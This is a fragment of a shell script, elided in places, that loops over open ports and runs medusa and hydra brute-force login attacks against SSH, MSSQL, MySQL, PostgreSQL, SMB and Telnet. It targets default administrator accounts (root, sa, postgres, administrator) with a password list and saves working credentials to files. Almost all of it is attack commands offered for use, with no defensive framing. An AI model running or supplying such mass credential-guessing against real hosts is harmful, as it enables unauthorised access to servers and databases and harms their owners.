...
do
    ...
    if [ $port -eq 22 ];then
        ...
        medusa -H ./${3}/${port}.txt -u root -e ns -P $5 -t 3 -T 16 -f -M ssh -R 3 -r 5 -O ./${3}/SSH_Login_succeed.txt
    ...
    if [ $port -eq 1433 ];then
        ...
        medusa -H ./${3}/${port}.txt -u sa -e ns -P $5 -t 3 -T 16 -f -M mssql -R 3 -r 5 -O ./${3}/Mssql_Login_succeed.txt
    ...
    if [ $port -eq 3306 ];then
        ...
        medusa -H ./${3}/${port}.txt -u root -e ns -P $5 -t 3 -T 16 -f -M mysql -R 3 -r 5 -O ./${3}/MySQL_Login_succeed.txt
    ...
    if [ $port -eq 5432 ];then
        ...
        medusa -H ./${3}/${port}.txt -u postgres -e ns -P $5 -t 3 -T 16 -f -M postgres -R 3 -r 5 -O ./${3}/PgSQL_Login_succeed.txt
    ...
    if [ $port -eq 445 ];then
        ...
        hydra -l administrator -P $5 -e ns -f -o ./${3}/Smb_Login_succeed.txt -M ./${3}/${port}.txt -t 5 -T 16 -w 20 -V smb
    ...
    if [ $port -eq 23 ];then
        ...
        medusa -H ./${3}/${port}.txt -U $4 -e ns -P $5 -t 3 -T 16 -f -M telnet -R 3 -r 5 -O ./${3}/Telnet_Login_succeed.txt
